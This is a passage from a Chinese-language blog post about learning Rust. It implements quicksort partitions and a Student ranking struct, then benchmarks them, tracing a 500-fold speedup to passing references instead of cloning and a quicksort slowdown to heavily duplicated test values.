<span class="token keyword">fn</span> <span class="token function-definition function">partition</span> <span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token punctuation">[</span><span class="token class-name">T</span><span class="token punctuation">]</span><span class="token punctuation">,</span> low<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span> high<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">usize</span>
<span class="token keyword">where</span>
    <span class="token class-name">T</span> <span class="token punctuation">:</span> <span class="token class-name">PartialOrd</span> <span class="token operator">+</span> <span class="token class-name">Clone</span><span class="token punctuation">,</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> pivot <span class="token operator">=</span> nums<span class="token punctuation">[</span>high<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> index <span class="token operator">=</span> low <span class="token punctuation">;</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> low<span class="token punctuation">..</span>high <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>pivot<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            index <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            nums<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>index <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>

        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    nums<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>high<span class="token punctuation">)</span><span class="token punctuation">;</span>
    index
<span class="token punctuation">&#125;</span>

<span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">compare</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token punctuation">:</span> <span class="token class-name">PartialOrd</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> num1 <span class="token punctuation">:</span> <span class="token class-name">T</span><span class="token punctuation">,</span> num2 <span class="token punctuation">:</span> <span class="token class-name">T</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>compare_time <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    num1 <span class="token operator">></span> num2
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>compare函数的比较对象并没有写成引用，这导致每次调用compare会移交所有权，而循环在继续，所以不得不.clone()，但这又会造成不必要的开销。i32类型时没有所有权问题是因为i32具有copy特征，其表示按位复制，当实现了copy特征后传参就会变成按位复制而非移动所有权。如果我传入一个指针，它会在函数结束被free掉，在自己的生命周期结束再被free，显然rust不会允许这种事情发生。涉及堆的、文件句柄、连接等的数据都无法实现copy特征</p>
<p>按理说compare的参数应当是引用，这是最标准的写法，这里为避免大面积修改clone了事了</p>
<p>接下来是Student结构体的实现，单独划分出一个字段记录名次，同时实现必要的特征<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[derive(Debug, Clone)]</span>
<span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">Student</span><span class="token punctuation">&#123;</span>
    id <span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>
    name <span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span>
    math <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">,</span>
    chinese <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">,</span>
    english <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">,</span>
    order <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">impl</span> <span class="token class-name">Student</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span>id <span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span> name <span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span> math <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">,</span> chinese <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">,</span> english <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">Self</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">Self</span><span class="token punctuation">&#123;</span>
            id<span class="token punctuation">,</span>
            name<span class="token punctuation">,</span>
            math<span class="token punctuation">,</span>
            chinese<span class="token punctuation">,</span>
            english<span class="token punctuation">,</span>
            order <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">impl</span> <span class="token namespace">fmt<span class="token punctuation">::</span></span><span class="token class-name">Display</span> <span class="token keyword">for</span> <span class="token class-name">Student</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">fmt</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> f<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token namespace">fmt<span class="token punctuation">::</span></span><span class="token class-name">Formatter</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'_</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token namespace">fmt<span class="token punctuation">::</span></span><span class="token class-name">Result</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> total <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>math <span class="token operator">+</span> <span class="token keyword">self</span><span class="token punctuation">.</span>chinese <span class="token operator">+</span> <span class="token keyword">self</span><span class="token punctuation">.</span>english<span class="token punctuation">;</span>
        <span class="token macro property">write!</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span><span class="token string">"学号：&#123;&#125;, 姓名：&#123;&#125; 总分:&#123;&#125;, 语文：&#123;&#125; 数学：&#123;&#125;英语：&#123;&#125;"</span><span class="token punctuation">,</span><span class="token keyword">self</span><span class="token punctuation">.</span>id<span class="token punctuation">,</span><span class="token keyword">self</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span>total<span class="token punctuation">,</span><span class="token keyword">self</span><span class="token punctuation">.</span>chinese<span class="token punctuation">,</span><span class="token keyword">self</span><span class="token punctuation">.</span>math<span class="token punctuation">,</span><span class="token keyword">self</span><span class="token punctuation">.</span>english<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">impl</span> <span class="token class-name">PartialEq</span> <span class="token keyword">for</span> <span class="token class-name">Student</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">eq</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> other<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">Self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> t1 <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>math <span class="token operator">+</span> <span class="token keyword">self</span><span class="token punctuation">.</span>chinese <span class="token operator">+</span> <span class="token keyword">self</span><span class="token punctuation">.</span>english<span class="token punctuation">;</span>
        <span class="token keyword">let</span> t2 <span class="token operator">=</span> other<span class="token punctuation">.</span>math <span class="token operator">+</span> other<span class="token punctuation">.</span>chinese <span class="token operator">+</span> other<span class="token punctuation">.</span>english<span class="token punctuation">;</span>
        t1 <span class="token operator">==</span> t2
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">impl</span> <span class="token class-name">PartialOrd</span> <span class="token keyword">for</span> <span class="token class-name">Student</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">partial_cmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> other<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">Self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Ordering</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> t1 <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>math <span class="token operator">+</span> <span class="token keyword">self</span><span class="token punctuation">.</span>chinese <span class="token operator">+</span> <span class="token keyword">self</span><span class="token punctuation">.</span>english<span class="token punctuation">;</span>
        <span class="token keyword">let</span> t2 <span class="token operator">=</span> other<span class="token punctuation">.</span>math <span class="token operator">+</span> other<span class="token punctuation">.</span>chinese <span class="token operator">+</span> other<span class="token punctuation">.</span>english<span class="token punctuation">;</span>

        t1<span class="token punctuation">.</span><span class="token function">partial_cmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>t2<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>然后是核心的排序输出：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">sort</span><span class="token punctuation">(</span><span class="token keyword">mut</span> s <span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Student</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> sort_instance <span class="token operator">=</span> <span class="token class-name">Sort</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> len <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    sort_instance<span class="token punctuation">.</span><span class="token function">quick_sort</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> current_score <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> current_order <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">..</span>len<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rev</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> order <span class="token operator">=</span> len <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">;</span>
        <span class="token keyword">let</span> score <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>chinese <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>math <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>english<span class="token punctuation">;</span>

        <span class="token keyword">let</span> <span class="token keyword">mut</span> index <span class="token operator">=</span> order<span class="token punctuation">;</span>
        <span class="token keyword">if</span> current_score <span class="token operator">==</span> score <span class="token punctuation">&#123;</span>
            index <span class="token operator">=</span> current_order<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            current_order <span class="token operator">=</span> index<span class="token punctuation">;</span>
            current_score <span class="token operator">=</span> score<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token macro property">info!</span><span class="token punctuation">(</span><span class="token string">"第&#123;&#125;名，&#123;&#125;"</span><span class="token punctuation">,</span>index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>这个名次处理感觉实现得笨笨的;总分应该单独维护一个字段的。倒序遍历列表输出，测试：</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[test]</span>
<span class="token keyword">fn</span> <span class="token function-definition function">test_2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> _ <span class="token operator">=</span> <span class="token namespace">tracing_subscriber<span class="token punctuation">::</span></span><span class="token function">fmt</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">with_max_level</span><span class="token punctuation">(</span><span class="token class-name">LevelFilter</span><span class="token punctuation">::</span><span class="token constant">INFO</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">with_test_writer</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">try_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> <span class="token keyword">mut</span> data <span class="token operator">=</span> <span class="token function">generate_test_data</span><span class="token punctuation">(</span><span class="token number">100_00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name">Student</span><span class="token punctuation">::</span><span class="token function">sort</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">generate_test_data</span><span class="token punctuation">(</span>count<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Student</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 预分配内存，避免 vector 扩容带来的性能损耗</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> rng <span class="token operator">=</span> <span class="token namespace">rand<span class="token punctuation">::</span></span><span class="token function">rng</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> students <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">with_capacity</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>count <span class="token punctuation">&#123;</span>
        students<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">Student</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>
            i <span class="token keyword">as</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>
            <span class="token macro property">format!</span><span class="token punctuation">(</span><span class="token string">"Student_&#123;&#125;"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">,</span>
            rng<span class="token punctuation">.</span><span class="token function">random_range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">..=</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 数学</span>
            rng<span class="token punctuation">.</span><span class="token function">random_range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">..=</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 语文</span>
            rng<span class="token punctuation">.</span><span class="token function">random_range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">..=</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 英语</span>
        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    students
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出belike:<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">2025</span>-12-23T07:29:15.759951Z  INFO ex7: 第99989名，学号：42516, 姓名：Student_42516 总分:7, 语文：2 数学：1英语：4
<span class="token number">2025</span>-12-23T07:29:15.760054Z  INFO ex7: 第99989名，学号：65695, 姓名：Student_65695 总分:7, 语文：1 数学：1英语：5
<span class="token number">2025</span>-12-23T07:29:15.760159Z  INFO ex7: 第99992名，学号：41828, 姓名：Student_41828 总分:6, 语文：6 数学：0英语：0
<span class="token number">2025</span>-12-23T07:29:15.760265Z  INFO ex7: 第99992名，学号：93845, 姓名：Student_93845 总分:6, 语文：4 数学：2英语：0
<span class="token number">2025</span>-12-23T07:29:15.760370Z  INFO ex7: 第99992名，学号：99254, 姓名：Student_99254 总分:6, 语文：3 数学：2英语：1
<span class="token number">2025</span>-12-23T07:29:15.760447Z  INFO ex7: 第99995名，学号：88285, 姓名：Student_88285 总分:5, 语文：1 数学：3英语：1
<span class="token number">2025</span>-12-23T07:29:15.760566Z  INFO ex7: 第99996名，学号：78260, 姓名：Student_78260 总分:4, 语文：1 数学：3英语：0
<span class="token number">2025</span>-12-23T07:29:15.760702Z  INFO ex7: 第99996名，学号：69322, 姓名：Student_69322 总分:4, 语文：2 数学：0英语：2
<span class="token number">2025</span>-12-23T07:29:15.760823Z  INFO ex7: 第99998名，学号：38750, 姓名：Student_38750 总分:3, 语文：2 数学：0英语：1
<span class="token number">2025</span>-12-23T07:29:15.760930Z  INFO ex7: 第99999名，学号：14388, 姓名：Student_14388 总分:2, 语文：0 数学：1英语：1
<span class="token number">2025</span>-12-23T07:29:15.761039Z  INFO ex7: 第99999名，学号：96388, 姓名：Student_96388 总分:2, 语文：0 数学：2英语：0
<span class="token builtin class-name">test</span> test::test_2 <span class="token punctuation">..</span>. ok

<span class="token builtin class-name">test</span> result: ok. <span class="token number">1</span> passed<span class="token punctuation">;</span> <span class="token number">0</span> failed<span class="token punctuation">;</span> <span class="token number">0</span> ignored<span class="token punctuation">;</span> <span class="token number">0</span> measured<span class="token punctuation">;</span> <span class="token number">0</span> filtered out<span class="token punctuation">;</span> finished <span class="token keyword">in</span> <span class="token number">21</span>.45s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="简单优化一下"><a href="#简单优化一下" class="headerlink" title="简单优化一下"></a>简单优化一下</h3><p>十万条学生数据的测试结果是21秒，然而实验1里只用了不到2毫秒，着实奇怪</p>
<p>首先去掉了日志输出：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">test</span> result: ok. <span class="token number">1</span> passed<span class="token punctuation">;</span> <span class="token number">0</span> failed<span class="token punctuation">;</span> <span class="token number">0</span> ignored<span class="token punctuation">;</span> <span class="token number">0</span> measured<span class="token punctuation">;</span> <span class="token number">0</span> filtered out<span class="token punctuation">;</span> finished <span class="token keyword">in</span> <span class="token number">4</span>.80s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>提升明显，但还差着数量级</p>
<p>然后加大编译优化<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cargo</span> <span class="token builtin class-name">test</span> <span class="token parameter variable">--release</span> -- <span class="token parameter variable">--nocapture</span>

<span class="token builtin class-name">test</span> result: ok. <span class="token number">1</span> passed<span class="token punctuation">;</span> <span class="token number">0</span> failed<span class="token punctuation">;</span> <span class="token number">0</span> ignored<span class="token punctuation">;</span> <span class="token number">0</span> measured<span class="token punctuation">;</span> <span class="token number">0</span> filtered out<span class="token punctuation">;</span> finished <span class="token keyword">in</span> <span class="token number">3</span>.06s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
<p>没有解决问题，首先的怀疑对象肯定是每次比较clone（心虚），那就把compare的参数改成引用吧<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">compare</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token punctuation">:</span> <span class="token class-name">PartialOrd</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> num1<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">T</span><span class="token punctuation">,</span> num2<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">T</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>compare_time <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    num1 <span class="token operator">></span> num2
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>结果:<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">test</span> result: ok. <span class="token number">1</span> passed<span class="token punctuation">;</span> <span class="token number">0</span> failed<span class="token punctuation">;</span> <span class="token number">0</span> ignored<span class="token punctuation">;</span> <span class="token number">0</span> measured<span class="token punctuation">;</span> <span class="token number">0</span> filtered out<span class="token punctuation">;</span> finished <span class="token keyword">in</span> <span class="token number">0</span>.06s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<p>居然只剩6ms了，快了500倍，可怕，这还包括了生成随机数的时间</p>
<p>比较有意思的是<code>--release</code>，如果正常打印日志速度变慢了两三倍（18 -&gt; 49s），而去掉日志又变快了一个数量级（67 -&gt; 6 ms）</p>
<h3 id="快排奇怪的变差"><a href="#快排奇怪的变差" class="headerlink" title="快排奇怪的变差"></a>快排奇怪的变差</h3><p>接下来测试了5千万、两亿的数据长度，发现堆排序和归并只需要2分钟左右，而快排奇怪地慢到了6min</p>
<p>测试多次结果不变。会是分区策略的影响吗？<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">partition_hoare</span> <span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token punctuation">[</span><span class="token class-name">T</span><span class="token punctuation">]</span><span class="token punctuation">,</span> low<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span> high<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">usize</span>
<span class="token keyword">where</span> 
    <span class="token class-name">T</span><span class="token punctuation">:</span> <span class="token class-name">PartialOrd</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> pivot_index <span class="token operator">=</span> low<span class="token punctuation">;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> l <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> h <span class="token operator">=</span> high<span class="token punctuation">;</span>

        <span class="token keyword">loop</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">while</span> l <span class="token operator">&lt;=</span> h <span class="token operator">&amp;&amp;</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>nums<span class="token punctuation">[</span>h<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>nums<span class="token punctuation">[</span>pivot_index<span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                h <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            
            <span class="token keyword">while</span> l <span class="token operator">&lt;=</span> h <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>nums<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>nums<span class="token punctuation">[</span>pivot_index<span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                l <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            <span class="token keyword">if</span> l <span class="token operator">></span> h <span class="token punctuation">&#123;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            nums<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>h<span class="token punctuation">,</span>l<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>
            l <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            h <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        nums<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>pivot_index<span class="token punctuation">,</span>h<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>
        h
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>测试结果是几乎没有变化</p>
<p>快排擅长排序散乱的数据，回看测试数据，是在正负10000区间内的随机数，是否是因为对于亿级的数据，这个区间太小碰撞太多？改成了正负一百万，发现快排的速度优势又回来了</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;h3 id=&quot;内部排序算法比较&quot;&gt;&lt;a href=&quot;#内部排序算法比较&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="从0开始的rust之旅" scheme="https://aucept.in/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84rust%E4%B9%8B%E6%97%85/"/>
    
    
    <category term="rust" scheme="https://aucept.in/tags/rust/"/>
    
